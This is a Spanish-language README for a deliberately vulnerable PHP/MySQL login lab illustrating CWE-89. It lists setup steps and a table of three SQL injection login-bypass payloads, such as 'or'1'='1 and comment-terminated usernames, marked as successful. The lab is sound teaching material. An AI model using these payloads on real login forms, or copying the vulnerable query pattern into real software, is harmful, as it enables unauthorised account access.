
# SQL Injection

CWE-89: neutralización incorrecta de elementos especiales utilizados en un comando SQL ('inyección SQL').
Una simulación de un sitio de login, donde se inyectará comandos SQL.

## Características

- Se necesita de un sistema de gestión de bases de datos MySQL, el servidor web Apache y los intérpretes para lenguajes de script PHP, en este caso se ocupo XAMPP.
- Meter la carpeta `CW89` en la carpeta que corresponda para cargar el web login.
- Y cargar la base de datos con el archivo  `database.sql` solo es importar la database y todo por default en phpmyadmin.


## Injection 

Una vez probado el sitio validando los usuarios del database, probar los comandos para los siguientes casos. En este caso se toma el primer usuario:


##### Comandos SQL 


| Usuario | Contraseña     | Estado                      |
| :-------- | :------- | :-------------------------------- |
| `'or'1'='1`      | `'or'1'='1` | Exitoso |
| `Efren`      | `' OR usuario='Efren' -- ` |Exitoso |
| `Efren' -- `      | Lo que sea | Exitoso |

### Nota:

- Para la segunda prueba en la contraseña al final se necesita un espacio
- Para la tercera prueba en la parte del usuario igual se requiere de un espacio
